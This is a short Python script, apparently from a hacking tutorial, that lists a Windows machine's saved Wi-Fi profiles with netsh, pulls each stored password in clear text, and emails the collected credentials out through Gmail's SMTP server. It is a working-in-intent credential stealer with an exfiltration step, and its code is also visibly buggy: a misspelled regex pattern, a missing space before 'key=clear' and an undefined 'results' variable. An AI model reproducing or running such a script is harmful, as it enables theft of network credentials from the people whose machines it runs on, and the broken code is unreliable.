#!/usr/bin/env python

import subprocess, smtplib, re

def send_mail(email,passwd,message):
	server = smtplib.SMTP("smtp.gmail.com",587)  # wer are creating a smtp server using smtplib
	# and the server is google's server and googles's server runs on 587 port
	server.starttls()  # initiating tls connection
	server.login(email,passwd)  # loging in in our email to send email
	server.sendmail(email, email,message)  # send email function
	# from: our email, to: our email , content: message
	server.quit()  # once we are done with this funciton close the server


command = "netsh wlan show profile"
networks = subprocess.check_output(command,shell=True)
network_names_list = re.findall("(?:Porfile\s*:\s)(.*)",networks)
# re.findall will look for the pattern in entire string and give you the all outputs unlike search will only give first occurance
# findall will return list \s* for any number of spaces and .* for anything after that ?: non-capturing group

result = ""
for network_name in network_names_list:
	# print(network_name)
	command = "netsh wlan show profile "+network_name+"key=clear"
	current_result = subprocess.check_output(command,shell=True)
	result = result + current_result
	

send_mail("YourEmail@address","passwd",results)



